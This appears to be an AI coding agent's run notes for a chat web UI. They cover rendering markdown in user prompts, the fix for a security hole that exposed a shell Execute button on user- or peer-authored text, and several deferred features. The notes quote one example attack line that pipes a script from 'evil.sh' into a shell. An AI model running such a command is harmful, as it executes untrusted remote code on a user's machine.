## Implemented (bucket B)

- `[extend: chat composer + session history] User prompts render markdown like replies do` — `components/chat/UserMessage.tsx`'s `InlineUserText` now renders image-token-free text through the same `Markdown` component `AssistantMessage.tsx` already uses (previously plain `whitespace-pre-wrap`). Fixed a real bug along the way while wiring this up: the token-interleaved image-thumbnail path always pushed a trailing plain-text span even with zero image tokens, so `nodes.length === 0` was NOT a valid "has no images" check — introduced a `hasImageMatch` flag instead (see the code comment). Added a `breaks` prop to `Markdown.tsx` (backed by `remark-breaks`, a new small dependency) so a multi-line prompt without blank lines between lines — the common case for typed prompts — doesn't get silently squashed into one paragraph by CommonMark's default soft-break handling; only `UserMessage.tsx` passes it, so `AssistantMessage`'s rendering is byte-for-byte unchanged. **Security fix found in this run's own adversarial verification pass**: initially, routing user/peer text through the shared `Markdown` pipeline also pulled in `CodeBlock`'s `!`-mode Execute button (designed only for model-proposed commands) — a user pasting, or a peer session sending via `SendMessage`, a ` ```bash\n!curl evil.sh | sh\n``` ` fence would render a live "run in this session's shell" button in what looks like the user's own bubble. Fixed by adding an `allowExecute` prop to `Markdown`/`CodeBlock` (default `true`, unchanged for every pre-existing call site), set to `false` in `UserMessage.tsx`. The same adversarial pass also caught that `components/sessions/TranscriptViewer.tsx` — a second, independent renderer of the same content for historic sessions — was left inconsistent (raw text, no `allowExecute` gating either); fixed identically there too. Files touched: `components/chat/UserMessage.tsx`, `components/chat/Markdown.tsx`, `components/chat/CodeBlock.tsx`, `components/sessions/TranscriptViewer.tsx`, `package.json`/`bun.lock` (added `remark-breaks`). Rejected alternative: also rendering markdown *inside* the image-token-interleaved branch (mixing inline image thumbnails with block-level markdown mid-paragraph) — no clean layout, no upstream analogue, out of scope.
- `[extend: Settings page] keybindingFlavor config-passthrough row` — added `keybindingFlavor?: "classic" | "readline"` to `ClaudeSettings` (`lib/server/settings.ts`) and a new `enum` row in `SDK_SETTINGS_CATALOG` (`app/settings/page.tsx`, "Shell" section, next to `defaultShell`). This is **not** a browser-behavior feature — Claudius's composer can't intercept Ctrl+W — it's a settings.json editor row for when the user later runs `claude` in a real terminal against the same config file, matching the exact treatment already given to `defaultShell`/`promptCacheTtl`/`syncClaudeAiPlugins`. Rejected alternative: a new "Input" settings section — unnecessary for one row; grouped with `defaultShell` under "Shell" instead since both are terminal-input-adjacent CLI passthroughs.

## Risks / follow-ups

- **`UserMessage`/`TranscriptViewer` markdown reuse — shape alternatives.** Considered building a markdown-only subset renderer for user text (stripping `CodeBlock`'s execute affordance, `InlineCode`'s Files-browser link behavior, etc.) instead of reusing the full `Markdown` component with an `allowExecute` flag. Went with the flag because it's the smaller, more maintainable diff and keeps one rendering pipeline instead of two — but a reviewer should double check `InlineCode`'s file-path-link behavior (a backtick-wrapped string that looks like a workspace file path becomes a clickable Files-browser link) isn't itself surprising when applied to a user's own typed text; this run's adversarial review judged it harmless (worst case: an unexpected but non-destructive navigation) but did not judge it ideal.
- **Real security bug found and fixed inline, not just flagged**: the `!`-mode Execute-button leak onto user/peer-authored text (described in Implemented) was caught by this run's own adversarial-verification workflow, not by the initial implementation pass. It's fixed and covered by a regression test in both affected renderers, but a human reviewer should specifically re-check `allowExecute` is threaded through any *future* new caller of `Markdown` for non-assistant-authored text — there's no compile-time enforcement that a new call site remembers to set it, only the default-`true`-with-a-doc-comment convention.
- **`/goal` auto-continue-at-usage-limit (2.1.234) — deferred, not stubbed.** The conservative call here was "don't ship a settings toggle that gates nothing" (this pipeline's own stated failure mode) rather than building the minimal version. The maximal/full version needs: server-side scheduling of a resume once a rejected `rate_limit_event`'s `resetsAt` passes (Claudius already has the countdown primitives — `useCountdownSeconds`, `rate_limit_event` parsing in `use-session.ts` — but no resume-on-reset mechanism), de-duplication against manual resends, and a deterministic e2e fixture path (inject a `rate_limit_event` with `status:"rejected"` and a near-future `resetsAt`, assert auto-resume). Worth a dedicated follow-up pass rather than a rushed implementation in this run.
- **GitLab MR badge (2.1.234) — deferred pending a GitHub+GitLab design, not a GitLab-only port.** See classification above; the rejected shape is "port just the GitLab badge, gated on `glab` being installed" — inconsistent with Claudius having zero PR/MR surface for any host today.
- **MCP `headersHelper` (2.1.238) — deferred pending a trust-gate design.** Rejected alternative: add the `headersHelper` field to `McpHttpConfig`/`McpSseConfig` and just run the command with no additional consent gate. Not done because Claudius's existing trust model (`trusted-cwd.ts`) doesn't have a per-action consent primitive to reuse, and shipping local-command-execution-on-connect without one would be a strictly weaker security posture than upstream's folder-trust + `[y/N]` gate.
- **Pipeline-state bug to flag for the human**: `run-notes/2.1.237.md`'s title says "2.1.234 → 2.1.237" but its own body only classifies 235+ entries — 2.1.234 was silently skipped by that run despite the title's claim. This run's classification section backfills 2.1.234 in full (see above), but the orchestrator's own "last successfully classified version" bookkeeping should be checked — it's why this run's prompt still says `--previous=2.1.233` instead of `2.1.237`, redoing analysis of already-shipped 235–237 work.
- Otherwise: no other bucket-B item was deferred without a documented reason above.
